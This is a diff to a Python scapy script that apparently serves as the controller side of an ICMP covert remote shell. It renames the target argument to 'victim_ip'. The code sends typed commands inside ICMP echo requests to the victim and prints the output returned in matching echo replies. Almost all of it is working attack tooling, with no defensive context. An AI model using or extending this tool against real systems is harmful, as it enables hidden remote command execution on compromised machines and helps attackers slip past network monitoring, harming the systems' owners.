@@ -14,14 +14,14 @@ def check_scapy():
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g. eth0)")
-parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
+parser.add_argument('-d', '--victim_ip', type=str, required=True, help="Destination IP address")
 args = parser.parse_args()
 
 def sniffer():
     sniff(iface=args.interface, prn=shell, filter="icmp", store="0")
 
 def shell(pkt):
-    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
+    if pkt[IP].src == args.victim_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
         icmppacket = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
         print(icmppacket)
     else:
@@ -40,7 +40,7 @@ def main():
         elif icmpshell == '':
             pass
         else:
-            payload = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=8,id=ICMP_ID)/Raw(load=icmpshell))
+            payload = (IP(dst=args.victim_ip, ttl=TTL)/ICMP(type=8,id=ICMP_ID)/Raw(load=icmpshell))
             sr(payload, timeout=0, verbose=0)
     sniffing.join()
 
